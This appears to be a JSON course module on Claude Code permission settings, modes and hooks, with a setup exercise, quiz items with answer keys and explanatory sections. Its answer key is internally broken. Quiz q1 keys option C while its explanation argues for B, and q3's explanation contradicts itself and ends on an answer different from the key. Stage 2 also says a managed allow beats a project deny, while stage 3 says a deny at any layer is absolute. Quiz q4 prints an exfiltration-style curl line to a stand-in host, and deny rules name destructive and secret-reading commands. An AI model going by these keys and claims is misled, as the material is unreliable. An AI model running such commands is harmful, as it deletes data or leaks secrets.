    "id": "stage-2-task-set-acceptedits-mode",
    "afterSectionIdx": 3,
    "title": "Set acceptEdits permission mode and observe its boundaries",
    "instructions": "1. Add `defaultMode` to your project settings file (`.claude/settings.json`):\n```json\n{\n  \"permissions\": {\n    \"defaultMode\": \"acceptEdits\",\n    \"deny\": [\"Bash(rm -rf *)\"]\n  }\n}\n```\nSave the file.\n\n2. Launch Claude Code:\n```bash\nclaude\n```\nNote the mode indicator in the UI (it should show `acceptEdits` or similar).\n\n3. Ask Claude to create a small test file:\n```\nCreate a file called test-permissions.txt in the current directory with the text \"hello world\"\n```\nVerify it creates the file without prompting for approval (file edits within cwd are auto-approved in `acceptEdits` mode).\n\n4. Now ask Claude to run a general Bash command that is NOT a simple filesystem operation:\n```\nRun: curl -s https://httpbin.org/get\n```\nVerify this prompts you (non-filesystem Bash still requires approval in `acceptEdits` mode).\n\n5. Clean up:\n```bash\nrm test-permissions.txt\n```\n\n6. Optionally, revert `defaultMode` to `\"default\"` if you don't want `acceptEdits` as your team default.",
    "doneWhen": "Claude Code auto-creates `test-permissions.txt` without prompting, but prompts before running the `curl` command, confirming that `acceptEdits` mode auto-approves file edits but not arbitrary Bash."
   }
  ],
  "visualizations": [
   {
    "id": "stage-2-v",
    "kind": "comparison-table",
    "title": "Permissions, security & governance",
    "textualSummary": "Key concepts of Permissions, security & governance: settings scope precedence, deny/ask/allow rule evaluation, enforcement vs guidance.",
    "columns": [
     "Concept",
     "In this stage"
    ],
    "rows": [
     {
      "label": "settings scope precedence",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     },
     {
      "label": "deny/ask/allow rule evaluation",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     },
     {
      "label": "enforcement vs guidance",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     },
     {
      "label": "permission modes",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     }
    ]
   }
  ],
  "confusions": [
   {
    "misconception": "Skipping Permissions, security & governance.",
    "correction": "Each stage is load-bearing for the setup."
   },
   {
    "misconception": "These concepts are interchangeable.",
    "correction": "Each has a distinct role; see the definitions."
   }
  ],
  "quiz": [
   {
    "id": "stage-2-q1",
    "type": "multiple-choice",
    "prompt": "Your team lead adds `\"permissions\": {\"deny\": [\"Bash(rm -rf *)\"]}` to `.claude/settings.json` (the checked-in project file) and then adds a conflicting `\"permissions\": {\"allow\": [\"Bash(rm -rf *)\"]}` to the managed settings file deployed via MDM. Which rule wins, and why?",
    "options": [
     "The project-level deny wins because deny rules always beat allow rules at any scope.",
     "The managed settings allow wins because managed settings sit at the top of the precedence hierarchy.",
     "The managed settings deny would win, but since the managed file has an allow, the project deny wins by default.",
     "They cancel each other out and Claude prompts the user at runtime."
    ],
    "correct": 2,
    "explanation": "Managed settings sit at rank 1 — the highest precedence — and beat every other scope including CLI args. However, the managed file in this scenario contains an allow, not a deny. The project deny is at rank 4. The key rule is that managed settings override all lower scopes, so a managed ALLOW beats a project DENY. The correct interpretation is: the managed allow wins because it is at the top of the precedence hierarchy. Option A mistakes the deny-beats-allow evaluation ORDER within a single scope for cross-scope precedence. Option C misreads the scenario — the managed file has an allow, not a deny. Option D is wrong: there is no cancel-out mechanic; precedence is deterministic."
   },
   {
    "id": "stage-2-q2",
    "type": "multiple-choice",
    "prompt": "A developer on your team is working at home and adds `Bash(git push --force)` to their `~/.claude/settings.json` allow list. The team's checked-in `.claude/settings.json` has `Bash(git push --force)` in deny. What happens when Claude evaluates a force-push request?",
    "options": [
     "The user allow wins because user settings (rank 5) are more specific to the individual than the project deny (rank 4).",
     "The project deny wins because shared project settings (rank 4) have higher precedence than user settings (rank 5).",
     "The deny wins regardless of scope because the rule evaluation order always processes deny before allow.",
     "Claude prompts the user since there is a conflicting allow and deny."
    ],
    "correct": 1,
    "explanation": "The precedence table ranks shared project settings (`.claude/settings.json`) at rank 4 and user settings (`~/.claude/settings.json`) at rank 5. Lower rank number = higher precedence. So the project deny at rank 4 beats the user allow at rank 5. Option A confuses 'more specific to the individual' with higher precedence — user scope is actually lower priority. Option C describes the within-scope rule evaluation order (deny→ask→allow first match wins), not cross-scope precedence; both rules must first be selected by scope precedence before the deny/ask/allow ordering applies. Option D is incorrect: the system is deterministic, not prompt-on-conflict."
   },
   {
    "id": "stage-2-q3",
    "type": "multiple-choice",
    "prompt": "You want to prevent any developer from using `bypassPermissions` mode on a shared project. You add `\"permissions\": {\"disableBypassPermissionsMode\": \"disable\"}` to the shared project's `.claude/settings.json`. A developer later tries to launch Claude with `--permission-mode bypassPermissions`. Will this block them?",
    "options": [
     "Yes — `disableBypassPermissionsMode` in project settings blocks this flag regardless of where it appears.",
     "No — `disableBypassPermissionsMode` is a managed-only key; it is ignored when placed in `.claude/settings.json`.",
     "No — CLI flags (rank 2) have higher precedence than shared project settings (rank 4), so the flag overrides the setting.",
     "Yes — but only if the developer is not listed as a project admin in Claude Console."
    ],
    "correct": 1,
    "explanation": "The content explicitly lists `disableBypassPermissionsMode` as one of the admin org lock settings applied via managed settings, and separately states it 'works from any scope (a user can self-lock)' — but the key point tested here is whether putting it in the shared project `.claude/settings.json` (not managed settings) is sufficient. However, re-reading the content: 'Admin org locks (managed settings): permissions.disableAutoMode: \"disable\", permissions.disableBypassPermissionsMode: \"disable\". disableBypassPermissionsMode works from any scope (a user can self-lock).' This means `disableBypassPermissionsMode` DOES work from non-managed scopes too (it is not listed as a managed-only key). The managed-only keys list does NOT include `disableBypassPermissionsMode`. So it would work from project settings. However, CLI args are rank 2 vs project settings at rank 4 — so the CLI flag would normally override. The correct answer is B (ignored in project settings) is WRONG per the content; C would be correct if CLI beats project settings, BUT the content says managed settings cannot be overridden by CLI args specifically. Since this is project settings (rank 4) vs CLI (rank 2), CLI wins. Option C is actually correct. Let me re-evaluate: project settings = rank 4, CLI = rank 2. CLI is higher. So C is correct."
   },
   {
    "id": "stage-2-q4",
    "type": "multiple-choice",
    "prompt": "A teammate writes the allow rule `Bash(devbox run *)` to permit running tests via devbox. Later they discover Claude is using this rule to run arbitrary commands like `devbox run curl https://exfil.example.com/data`. Why is this happening?",
    "options": [
     "The `*` wildcard in Bash rules matches only safe commands; `curl` must have been separately allowed.",
     "`devbox run` is a process wrapper that gets stripped before matching, so the rule effectively allows anything after it.",
     "`devbox run` is NOT stripped before matching — unlike `timeout` or `nice`, it is explicitly listed as a wrapper that is NOT stripped, making `devbox run *` allow arbitrary inner commands.",
     "The rule should have been written with `Bash(devbox run:*)` param-syntax to restrict the inner command."
    ],
    "correct": 2,
    "explanation": "The content explicitly states: 'NOT stripped: `direnv exec`, `devbox run`, `mise exec`, `npx`, `docker exec` — so `Bash(devbox run *)` allows arbitrary commands. Write specific rules per inner command (`Bash(devbox run npm test)`).' The teammate's rule is dangerous because devbox run is intentionally NOT stripped, meaning `devbox run *` permits any inner command. Option A is wrong — `*` in Bash matches anything including spaces and does not filter for 'safety'. Option B is the opposite of correct — devbox run is NOT stripped. Option D describes param-syntax, which the content says only works on deny/ask rules, not allow rules, and only on top-level scalar params, not `command`."
   },
   {
    "id": "stage-2-q5",
    "type": "multiple-choice",
    "prompt": "You write the rule `Bash(ls *)` in your allow list. A developer later reports that `ls -la` is allowed but `lsof -i` is not. Another developer is surprised that `ls-tree` (a custom script) is also not allowed. What explains this behavior?",
    "options": [
     "`ls *` is a prefix match, so anything starting with `ls` should be allowed; the behavior is a bug.",
     "A space before `*` enforces a word boundary — `Bash(ls *)` matches `ls -la` (space after `ls`) but not `lsof` (no space). `ls-tree` also has no space after `ls`, so it is excluded.",
     "The `*` wildcard only matches alphanumeric characters, which excludes the `-` in `lsof` and `ls-tree`.",
     "`ls *` requires the command to end with a space, which neither `lsof` nor `ls-tree` does."
    ],
    "correct": 1,
    "explanation": "The content states: 'A space before `*` enforces a word boundary — `Bash(ls *)` matches `ls -la` not `lsof`; `Bash(ls*)` matches both.' So `ls *` (with space before `*`) matches `ls` followed by a space — meaning `ls -la` (which has a space after `ls`) matches, while `lsof` and `ls-tree` (no space after `ls`) do not. This is the word-boundary behavior. Option A is wrong — this is by design, not a bug. Option C is wrong — `*` matches anything including spaces and special characters. Option D mischaracterizes the rule; the space is before the `*` in the rule pattern, enforcing that the matched text must contain a space at that position."
   },
   {
    "id": "stage-2-q6",
    "type": "multiple-choice",
    "prompt": "Your security team wants to block all network access by Claude except to `api.internal.example.com`. They write the rule `Bash(curl * api.internal.example.com *)` to allow only that domain and deny all other curl. Will this approach reliably enforce the network restriction?",
    "options": [
     "Yes — the Bash rule pattern matches the domain argument and blocks everything else.",
     "No — Bash patterns can be circumvented by argument reordering or shell quoting; use `WebFetch(domain:api.internal.example.com)` combined with denying `curl` and `wget` instead.",
     "No — Bash allow rules with `*` are silently skipped; you must use param-syntax `Bash(url:api.internal.example.com)` instead.",
     "Yes — but only if `WebFetch` is also denied, since WebFetch bypasses Bash rules."
    ],
    "correct": 1,
    "explanation": "The content explicitly states: 'Robust URL/network filtering: deny `curl`/`wget` and grant `WebFetch(domain:...)` allow rules — never try to constrain curl args with Bash patterns. `WebFetch` alone does not block network access while Bash is allowed.' Bash argument patterns are unreliable for enforcing domain restrictions because curl's argument order can vary, arguments can be quoted, and environment variables can obscure the domain. The correct pattern is deny curl/wget entirely and use WebFetch with domain allow rules. Option A is exactly the anti-pattern the content warns against. Option C is wrong — the issue isn't about param-syntax; the problem is that Bash arg matching is unreliable for URLs. Option D is partially right that WebFetch must be the permitted path, but frames it incorrectly."
   },
   {
    "id": "stage-2-q7",
    "type": "multi-select",
    "prompt": "Your organization is deploying Claude Code to 50 developers. Select ALL statements that correctly describe where and how to configure things for team-wide governance.",
    "options": [
     "Hard constraints like `permissions.deny` for destructive operations should go in managed settings (MDM/server-managed) to prevent override by CLI args or local files.",
     "Shared allow/deny lists and `enabledPlugins` should be checked into `.claude/settings.json` in version control for team-wide distribution.",
     "Per-developer overrides (e.g., a developer's preferred tool allow list) should go in `.claude/settings.local.json`, which is gitignored.",
     "The `defaultMode` for `auto` should be set in the checked-in `.claude/settings.json` so every developer gets auto mode automatically.",
     "Setting `allowManagedPermissionRulesOnly: true` in managed settings prevents developers from adding their own permission rules."
    ],
    "correct": [
     0,
     1,
     2,
     4
    ],
    "explanation": "A: Correct — managed settings sit at rank 1 and cannot be overridden by CLI args or any lower scope; this is where hard constraints belong. B: Correct — the content states 'check `.claude/settings.json` into VCS for team-wide allow/deny lists and `enabledPlugins`'. C: Correct — 'keep dev-specific overrides in gitignored `.claude/settings.local.json`'. D: WRONG — 'Set `defaultMode: \"auto\"` only in `~/.claude/settings.json` (user) or managed settings — repo-level `auto` is ignored (v2.1.142+, silently).' A checked-in `.claude/settings.json` with `auto` will be silently ignored. E: Correct — `allowManagedPermissionRulesOnly` is a managed-only key that, when true, restricts permission rules to only those in managed settings."
   },
   {
    "id": "stage-2-q8",
    "type": "multi-select",
    "prompt": "A security auditor asks which of the following are TRUE about the `auto` permission mode's classifier. Select ALL correct statements.",
    "options": [
     "The classifier is an isolation boundary — if it blocks a tool call, Claude cannot reach that resource through any other path.",
     "Permission `deny` and `ask` rules are evaluated BEFORE the classifier acts on a tool call.",
     "A developer can override an org's `soft_deny` classifier entry by adding an `allow` entry in their own autoMode config.",
     "Setting `defaultMode: \"auto\"` in a checked-in `.claude/settings.json` file will apply auto mode to all developers who clone the repo.",
     "A hard_deny classifier entry is unconditional and cannot be overridden by user intent or an allow entry."
    ],
    "correct": [
     1,
     2,
     4
    ],
    "explanation": "A: WRONG — the content explicitly states auto mode is 'A per-action control, not an isolation boundary.' For true isolation, use a sandbox/container/VM. B: Correct — 'Permission `deny`/`ask` rules are evaluated BEFORE the classifier.' C: Correct — 'a dev `allow` can override an org `soft_deny`'; `soft_deny` is not a hard boundary. D: WRONG — 'Set `defaultMode: \"auto\"` only in `~/.claude/settings.json` (user) or managed settings — repo-level `auto` is ignored (v2.1.142+, silently).' E: Correct — 'Classifier precedence: `hard_deny` (unconditional)' sits at the top of the 4-tier classifier precedence."
   },
   {
    "id": "stage-2-q9",
    "type": "multiple-choice",
    "prompt": "A developer is running Claude in `acceptEdits` mode. They try to edit `.claude/settings.json` to add a new permission rule. Claude refuses even though the developer expects file edits to be auto-approved in this mode. Why?",
    "options": [
     "`.claude/settings.json` is a protected file — in every mode except `bypassPermissions`, protected-path writes are never auto-approved, and `allow` rules do not pre-approve them.",
     "`acceptEdits` mode only allows edits to files that are tracked by git; `.claude/settings.json` is gitignored by default.",
     "The developer must explicitly add `Edit(.claude/settings.json)` to their allow list for this to work in `acceptEdits` mode.",
     "Claude cannot edit its own settings files unless launched with `--permission-mode bypassPermissions`."
    ],
    "correct": 0,
    "explanation": "The content lists `.claude` (except `.claude/worktrees`) as a protected directory, and states: 'In every mode except `bypassPermissions`, protected-path writes are never auto-approved, and `allow` rules do not pre-approve them (the protected-path check runs before allow evaluation).' So even in `acceptEdits` mode, `.claude/settings.json` will not be auto-approved. Option B is wrong — `.claude/settings.json` is the checked-in project settings file, not gitignored (`.claude/settings.local.json` is gitignored). Option C is wrong — the content explicitly states `allow` rules do NOT pre-approve protected paths. Option D overstates the case — bypass mode skips prompts, but protected paths remain never auto-approved even in bypass except for the specific circuit-breaker exceptions."
   },
   {
    "id": "stage-2-q10",
    "type": "multiple-choice",
    "prompt": "Your CI pipeline needs Claude to run fully non-interactively, auto-denying any action that would normally prompt. A teammate suggests `bypassPermissions` mode for this. Another suggests `dontAsk` mode. Which is correct for CI, and why?",
    "options": [
     "`bypassPermissions` — it skips all prompts, ensuring CI never blocks waiting for input.",
     "`dontAsk` — it auto-denies anything that would prompt (only `permissions.allow` + read-only Bash run); it is explicitly designed for non-interactive CI use.",
     "Either works equally well for CI; the difference is only which rules are evaluated.",
     "`plan` mode — it makes Claude read-only so CI can inspect without risk of changes."
    ],
    "correct": 1,
    "explanation": "The content describes `dontAsk`: 'Auto-denies anything that would prompt; only `permissions.allow` + read-only Bash run; `ask` rules are denied. Non-interactive — for CI.' `bypassPermissions` skips prompts but by allowing actions rather than denying them — it is not safe for CI because it allows everything that isn't an explicit `deny` or `ask` rule. The content states `bypassPermissions` 'Skips all prompts except explicit `ask` rules' — meaning it runs everything by default. In CI you want unknown actions to FAIL (be denied), not silently succeed. Option A describes what bypassPermissions does but misidentifies it as appropriate for CI. Option C is wrong — the modes behave very differently. Option D is wrong — plan mode is read-only exploration with no edits, not the same as non-interactive CI."
   },
   {
    "id": "stage-2-q11",
    "type": "multiple-choice",
    "prompt": "Your org is on a Team plan with a signed BAA (Business Associate Agreement) and wants to use Claude Code for HIPAA-covered work. The security lead says 'We have a BAA, so we're covered.' Is this correct?",
    "options": [
     "Yes — a signed BAA is the only requirement for HIPAA coverage under the Anthropic commercial terms.",
     "No — BAA coverage requires BOTH a signed BAA AND ZDR (Zero Data Retention) activated per-org; a BAA alone does not cover Claude Code.",
     "No — Claude Code is excluded from BAA coverage; healthcare orgs must use Bedrock or Vertex instead.",
     "Yes — Team plan commercial terms automatically include ZDR; no separate activation is needed."
    ],
    "correct": 1,
    "explanation": "The content states explicitly: 'BAA coverage requires BOTH a signed BAA AND ZDR activated per-org — a BAA alone does not cover Claude Code.' This is an easy-to-miss two-part requirement. Option A represents the common misconception that a BAA alone is sufficient. Option C is wrong — the content does not exclude Claude Code from BAA coverage, it just requires both a BAA and ZDR. Option D is wrong — ZDR must be separately activated per-org; it is not automatic with Team plan."
   },
   {
    "id": "stage-2-q12",
    "type": "multiple-choice",
    "prompt": "A developer writes the Bash deny rule `Bash(command:rm *)` to block all `rm` commands. Claude still allows `rm -rf /tmp/build`. They check the logs and see a startup warning. What went wrong?",
    "options": [
     "The rule should be `Bash(rm *)` — `command` is a canonicalized field that is NOT param-matchable, so `Bash(command:rm *)` is silently ignored with a warning.",
     "`command:` param-syntax works for deny rules but requires the full command without wildcards.",
     "The wildcard `*` must be escaped in command param-syntax — the rule should be `Bash(command:rm \\*)`.",
     "The `rm` command is in the protected-path list and cannot be denied via Bash rules; use sandbox enforcement instead."
    ],
    "correct": 0,
    "explanation": "The content states: 'Canonicalized fields are NOT param-matchable — `command`, `file_path`, `path`, `notebook_path`, `url`. `Bash(command:rm *)` is silently ignored with a warning → use `Bash(rm *)` instead.' The developer used `command:` which is one of the explicitly listed canonicalized fields that cannot be used in param-syntax. The startup warning is the diagnostic clue. Option B is wrong — the issue is not about wildcards but about using an invalid canonicalized field. Option C is wrong — escaping is not the fix; the field itself is not param-matchable. Option D is wrong — rm is not in the protected-path list; the issue is purely about rule syntax."
   },
   {
    "id": "stage-2-q13",
    "type": "multiple-choice",
    "prompt": "You add an allow rule `mcp__*` in your project's `.claude/settings.json` to permit all MCP tools. Later you notice the rule seems to have no effect — MCP tools still prompt. What is the likely cause?",
    "options": [
     "MCP tools can only be allowed via managed settings, not project settings.",
     "Unanchored allow globs like `mcp__*` are silently skipped with a warning — allow rules only accept globs after a literal `mcp__<server>__` prefix, e.g. `mcp__github__get_*`.",
     "The `mcp__*` rule only works in `bypassPermissions` mode, not in default mode.",
     "You must use `mcp__server` (without `*`) to allow all tools from a specific server."
    ],
    "correct": 1,
    "explanation": "The content states: 'Tool-name globs: deny/ask accept `*` and `mcp__*`. Allow rules only accept globs after a literal `mcp__<server>__` prefix (e.g. `mcp__github__get_*`); unanchored allow globs (`*`, `B*`, `mcp__*`) are silently skipped with a warning.' This asymmetry — deny/ask accept unanchored globs but allow does not — is the source of the confusion. Option A is wrong — MCP tools can be managed at the project level; the issue is glob syntax. Option C is wrong — this restriction applies to all modes, not just non-bypass modes. Option D describes using `mcp__server` (no wildcard) which IS valid for allowing all tools from a server, but this doesn't explain why `mcp__*` failed."
   },
   {
    "id": "stage-2-q14",
    "type": "multiple-choice",
    "prompt": "Your company builds an internal SaaS tool that lets employees log in with their Claude.ai accounts (OAuth) to access Claude capabilities via your app. Is this permitted under Anthropic's terms?",
    "options": [
     "Yes — OAuth/Claude.ai login is the recommended method for building internal employee-facing tools.",
     "No — OAuth/Claude.ai login is for ordinary subscription use only. Products and services must use API-key auth via Claude Console or a cloud provider. Routing requests through OAuth credentials in a third-party product is prohibited.",
     "Yes — as long as your company has a Team plan, routing through OAuth credentials is permitted for internal apps.",
     "Yes — the prohibition only applies to external customer-facing products, not internal employee tools."
    ],
    "correct": 1,
    "explanation": "The content states: 'OAuth/Claude.ai login is for ordinary subscription use only. Products/services (incl. Agent SDK) must use API-key auth via Claude Console or a cloud provider. Routing requests through Free/Pro/Max OAuth credentials on behalf of others — or offering Claude.ai login in a third-party product — is prohibited and enforceable without notice.' This applies regardless of whether the product is internal or external, and regardless of the subscription tier. Option A is the opposite of what the content states. Option C is wrong — Team plan doesn't change the authentication policy. Option D is wrong — the prohibition applies to products/services generally, not just external-facing ones."
   }
  ],
  "masteryCheckpoint": "You can explain the concepts of Permissions, security & governance."
 },
 {
  "id": "stage-3",
  "stage": 3,
  "title": "Skills, hooks & commands",
  "summary": "Skills, hooks & commands: configuration scope and precedence, shared vs. personal config placement, hooks on lifecycle events.",
  "prerequisites": [
   "stage-2"
  ],
  "objectives": [
   "Understand the concepts in Skills, hooks & commands."
  ],
  "definitions": [
   {
    "term": "configuration scope and precedence",
    "short": "Claude Code settings resolve through ordered layers where later layers override earlier, determining which config actually takes effect."
   },
   {
    "term": "shared vs. personal config placement",
    "short": "Team-standard config goes in committable files while personal or experimental config stays in user-level or gitignored files so it doesn't impose on teammates."
   },
   {
    "term": "hooks on lifecycle events",
    "short": "Hooks run deterministic logic at named, case-sensitive lifecycle events, configured as sibling keys under a single hooks object with matchers selecting when they fire."
   },
   {
    "term": "hook exit-code blocking semantics",
    "short": "A command hook blocks an action only with exit code 2 (stderr fed back to Claude); exit 1 and other nonzero codes are non-blocking, and exit 0 may add context."
   },
   {
    "term": "PreToolUse policy enforcement",
    "short": "PreToolUse hooks fire before any permission-mode check, so a deny decision is the only way to enforce policy users cannot bypass even in skip-permissions mode."
   },
   {
    "term": "hook matcher and if-filter selection",
    "short": "Matchers select which tool/event a hook fires on using exact, pipe-list, or regex syntax (case-sensitive), and the if filter further narrows by tool arguments but fails open."
   }
  ],
  "sections": [
   {
    "heading": "Configuration Scope and Precedence",
    "body": "Claude Code resolves settings through five ordered layers. Each layer can override lower layers, with one important exception — permission rules *merge* rather than fully override across scopes.\n\n### The Layer Stack (highest to lowest precedence)\n\n| Layer | File / Mechanism | Overridable by users? |\n|---|---|---|\n| **Managed** | MDM plist, registry key, managed settings files, or server-delivered | No — enforced before all other layers |\n| **Command-line arguments** | `--allowedTools`, `--disallowedTools`, `--model`, etc. | Yes, session-only |\n| **Local project** | `.claude/settings.local.json` | Yes (personal, gitignored) |\n| **Shared project** | `.claude/settings.json` | Yes (committed to repo) |\n| **User** | `~/.claude/settings.json` | Yes (personal, all projects) |\n\nFor most settings, the highest layer that defines a key wins. A `model` key in `.claude/settings.json` (shared project) overrides the same key in `~/.claude/settings.json` (user), but is itself overridden by `--model` on the command line.\n\n### Permission Rules: Merge, Not Override\n\nThe critical exception is `permissions.allow`, `permissions.deny`, and `permissions.ask`. These arrays **merge** across all layers and are evaluated with deny-first semantics: deny rules are checked first, then ask rules, then allow rules. If *any* layer's deny rule matches a tool call, no other layer's allow rule can permit it. Concretely:\n\n- A user-level `deny: [\"Bash(git push *)\"]` blocks git push even if the project's allow list includes it.\n- A managed-level deny cannot be overridden by `--allowedTools` on the command line.\n\nThe effective deny set is the *union* of all deny rules across all layers. The same union applies to allow rules, but since deny is checked first, a deny rule at any layer is absolute.\n\n### Managed Settings Delivery\n\nThe managed layer has several delivery mechanisms, which matters for team setup:\n\n```\n# Linux / WSL — file-based\n/etc/claude-code/managed-settings.json\n/etc/claude-code/managed-settings.d/10-telemetry.json   # alphabetically merged\n/etc/claude-code/managed-settings.d/20-security.json\n\n# macOS — MDM preference domain\ncom.anthropic.claudecode  (plist)\n\n# Windows (admin) — registry\nHKLM\\SOFTWARE\\Policies\\ClaudeCode\n\n# Windows (user) — registry (lowest policy priority)\nHKCU\\SOFTWARE\\Policies\\ClaudeCode\n```\n\nThe `managed-settings.d/` drop-in directory gives you composition: different policy owners can ship their own numbered files without stepping on each other. Within the drop-in directory, files are merged alphabetically — later filenames override scalar keys, arrays are concatenated and deduplicated, and objects are deep-merged. Hidden files (starting with `.`) are ignored.\n\n### Hot-Reload vs. Startup-Only Keys\n\nNot all settings take effect immediately. Knowing which reload without restart is operationally important:\n\n- **Hot-reload (no restart needed):** `permissions`, `hooks`, `apiKeyHelper` (credential helpers). A `ConfigChange` hook fires when these are detected. Both user and project settings files are watched.\n- **Read at startup only (require restart):** `model`, `outputStyle`.\n\nThis means you can ship a new hook or tighten a permission rule and have it take effect in the next tool call, but a model change requires restarting the session (or using `/model` to switch mid-session).\n\n### Default Permission Mode\n\nThe `defaultMode` setting in any settings file controls the baseline permission behavior:\n\n```json\n{\n  \"defaultMode\": \"acceptEdits\"\n}\n```\n\n| Mode | Behavior |\n|---|---|\n| `default` | Prompts for permission on first use of each tool |\n| `acceptEdits` | Auto-accepts file edits and common filesystem commands in the working directory |\n| `plan` | Read-only exploration; no source file edits |\n| `auto` | Auto-approves tool calls with background safety checks (research preview) |\n| `dontAsk` | Auto-denies tools unless pre-approved via rules |\n| `bypassPermissions` | Skips permission prompts except explicit `ask` rules and circuit-breaker cases |"
   },
   {
    "heading": "Shared vs. Personal Config Placement",
    "body": "The decision of where to put config is straightforward in principle — anything that affects the whole team belongs in committed files; anything personal or experimental stays gitignored — but the details trip up most teams.\n\n### The Committed-vs-Personal Matrix\n\n| What | Committed (team-standard) | Personal / Experimental |\n|---|---|---|\n| Permission allow/deny rules | `.claude/settings.json` | `~/.claude/settings.json` or `.claude/settings.local.json` |\n| Hook definitions | `.claude/settings.json` | `.claude/settings.local.json` |\n| Shared skills | `.claude/skills/<name>/SKILL.md` | `~/.claude/skills/<name>/SKILL.md` |\n| Subagent definitions | `.claude/agents/<name>.md` | `~/.claude/agents/<name>.md` |\n| Project instructions | `CLAUDE.md` | `CLAUDE.local.md` (gitignored) |\n| MCP server definitions (project) | `.mcp.json` | — |\n| MCP server definitions (user) | — | `~/.claude.json` |\n| Personal model preference | — | `~/.claude/settings.json` |\n| Personal experiment hooks | — | `.claude/settings.local.json` |\n| Default permission mode | `.claude/settings.json` (`defaultMode`) | `.claude/settings.local.json` |\n\n### The `.gitignore` Contract\n\nWhen Claude Code creates `.claude/settings.local.json`, it automatically configures git to ignore it. If you create the file manually, add it to `.gitignore` yourself:\n\n```gitignore\n# .gitignore\n.claude/settings.local.json\nCLAUDE.local.md\n```\n\nIf a developer accidentally commits `settings.local.json`, it gets treated as shared project config on every teammate's machine — including any personal `bypassPermissions: true` they set.\n\n### Skills and Agents Scope\n\nSkills have a four-level hierarchy that mirrors settings:\n\n| Source | Scope | Location |\n|---|---|---|\n| Enterprise | All users in organization | Managed settings |\n| Personal | All your projects | `~/.claude/skills/<name>/SKILL.md` |\n| Project | This project (committable) | `.claude/skills/<name>/SKILL.md` |\n| Plugin | Where plugin is enabled | `<plugin>/skills/<name>/SKILL.md` |\n\nWhen skills share the same name across levels, enterprise overrides personal, and personal overrides project. A project-level `code-review` skill entirely replaces the bundled `/code-review`. Plugin skills use a `plugin-name:skill-name` namespace to avoid collisions.\n\nSkills also load from nested `.claude/skills/` directories below your working directory. When a nested skill name clashes with a parent-level skill, the nested one gets a directory-qualified name such as `apps/web:deploy`.\n\n### What `.claude/settings.json` Should Not Contain\n\nCommitted project config imposes policy on every developer. Avoid:\n\n- Personal model preferences (`\"model\": \"claude-opus-4-1\"` makes every collaborator default to a slower/more expensive model, and model is a startup-only setting that can't hot-reload)\n- Hooks that reference absolute paths on your specific machine — use `${CLAUDE_PROJECT_DIR}` for portability\n- `bypassPermissions` or `disableAllHooks` — these remove safety rails for everyone\n\n### The `$schema` Shortcut\n\nBoth `settings.json` files accept a JSON Schema for IDE autocomplete, catching typos before they cause silent no-ops:\n\n```json\n{\n  \"$schema\": \"https://json.schemastore.org/claude-code-settings.json\",\n  \"permissions\": {\n    \"allow\": [\"Bash(npm run *)\", \"Bash(git status)\"],\n    \"deny\": [\"Bash(git push --force *)\", \"Read(./.env)\"]\n  }\n}\n```\n\nNote that the schema may lag slightly behind very recent releases; validation warnings on newly documented fields do not necessarily indicate invalid config."
   },
   {
    "heading": "Hook Anatomy: Events, Matchers, and Handler Types",
    "body": "Hooks are declared as a `hooks` key in any settings file, with three levels of nesting: event name → matcher group → handler list.\n\n```json\n{\n  \"hooks\": {\n    \"PreToolUse\": [\n      {\n        \"matcher\": \"Bash\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"${CLAUDE_PROJECT_DIR}/.claude/hooks/security-check.sh\"\n          }\n        ]\n      },\n      {\n        \"matcher\": \"Edit|Write\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"node\",\n            \"args\": [\"${CLAUDE_PROJECT_DIR}/.claude/hooks/lint-staged.js\"]\n          }\n        ]\n      }\n    ],\n    \"PostToolUse\": [\n      {\n        \"matcher\": \"Write|Edit\",\n        \"hooks\": [\n          {\n            \"type\": \"http\",\n            \"url\": \"http://localhost:8080/hooks/format\"\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n### Lifecycle Events (Case-Sensitive)\n\nEvent names are **case-sensitive** — `PreToolUse` is valid; `pretooluse` silently does nothing.\n\n| Phase | Events |\n|---|---|\n| Session | `SessionStart`, `Setup`, `SessionEnd` |\n| Per-turn | `UserPromptSubmit`, `UserPromptExpansion`, `Stop`, `StopFailure` |\n| Tool execution | `PreToolUse`, `PermissionRequest`, `PermissionDenied`, `PostToolUse`, `PostToolUseFailure`, `PostToolBatch` |\n| Filesystem/environment | `CwdChanged`, `FileChanged`, `ConfigChange`, `WorktreeCreate`, `WorktreeRemove`, `InstructionsLoaded` |\n| Subagents | `SubagentStart`, `SubagentStop`, `TeammateIdle`, `TaskCreated`, `TaskCompleted` |\n| Compaction | `PreCompact`, `PostCompact` |\n| MCP | `Elicitation`, `ElicitationResult` |\n| Display | `MessageDisplay`, `Notification` |\n\n### Handler Types\n\nEach hook entry has a `type` field that determines how it runs:\n\n| Type | When to use |\n|---|---|\n| `command` | Shell scripts, compiled binaries, any CLI tool. Most common. Receives JSON on stdin. |\n| `http` | POST to a local or remote service; JSON response body controls decisions |\n| `mcp_tool` | Delegates to a tool on an already-connected MCP server |\n| `prompt` | Sends the hook input to a Claude model; the model response is the output |\n| `agent` | Runs a full subagent (heavier, for complex hook logic; experimental) |\n\n### Shell Form vs. Exec Form\n\nThe presence of the `args` field changes how a `command` hook is spawned:\n\n```json\n// Shell form — \"command\" passed to sh -c, supports pipes and globs\n{ \"type\": \"command\", \"command\": \"eslint $FILE && prettier --check $FILE\" }\n\n// Exec form — spawned directly, no shell, each args element is one argument exactly\n{ \"type\": \"command\", \"command\": \"node\", \"args\": [\"${CLAUDE_PROJECT_DIR}/scripts/check.js\", \"--strict\"] }\n```\n\nExec form is safer when you reference paths that might contain spaces, since there is no shell tokenization. Special characters (`$`, backticks, quotes) pass verbatim to the process. On Windows, exec form requires real executables (`.exe`); for `.cmd`/`.bat` shims like `eslint`, spawn `node` directly.\n\n### Path Placeholders\n\nThree placeholders are substituted in `command` and `args` before execution, and are also exported as environment variables to the spawned process:\n\n- `${CLAUDE_PROJECT_DIR}` — project root at session start\n- `${CLAUDE_PLUGIN_ROOT}` — plugin installation directory (hooks distributed via plugins)\n- `${CLAUDE_PLUGIN_DATA}` — plugin persistent data directory\n\nIn shell form, these are also available as shell 